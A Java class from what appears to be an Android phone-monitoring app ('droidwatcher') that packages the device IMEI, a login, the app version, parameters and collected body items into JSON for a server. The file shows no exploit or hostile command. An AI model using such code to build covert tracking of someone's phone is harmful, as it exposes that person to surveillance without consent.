package com.droidwatcher.variables;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map.Entry;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.services.AppService;

public class ServerMessage implements IServerMessage {
	public MessageType mMessageType;
	private String mImei;
	private String mLogin;
	private ArrayList<IMessageBody> mMessageBody;
	private HashMap<String, Object> mParams;
	private String ver;
	
	public ServerMessage(MessageType type, String imei, String login){
		this(type, imei, login, null);
	}
	
	public ServerMessage(MessageType type, String imei, String login, ArrayList<IMessageBody> body){
		this.mMessageType = type;
		this.mImei = imei;
		this.mLogin = login;
		this.mMessageBody = body;
		this.mParams = new HashMap<String, Object>();
		
		this.ver = AppService.APP_VERSION;
	}
	
	public ServerMessage addElementToBody(IMessageBody element){
		if (mMessageBody == null) {
			mMessageBody = new ArrayList<IMessageBody>();
		}
		
		mMessageBody.add(element);
		return this;
	}
	
	public ServerMessage addParam(String key, Object value){
		mParams.put(key, value);
		return this;
	}
	
	public String getJSONString(){
		try {
			JSONObject obj = new JSONObject();
			obj.put("type", mMessageType.name());
			
			for (Entry<String, Object> entry:mParams.entrySet()){
				obj.put(entry.getKey(), entry.getValue());
			}
			
			obj.put("imei", mImei);
			obj.put("login", mLogin);
			obj.put("ver", ver);
			
			if (mMessageBody != null) {
				JSONArray arr = new JSONArray();
				for (IMessageBody element : mMessageBody) {
					arr.put(element.getJSONObject());
				}
				obj.put("body", arr);
			}
			
			return obj.toString();
		} catch (JSONException e) {
			return "";
		}
	}

	@Override
	public MessageType getType() {
		return mMessageType;
	}
}
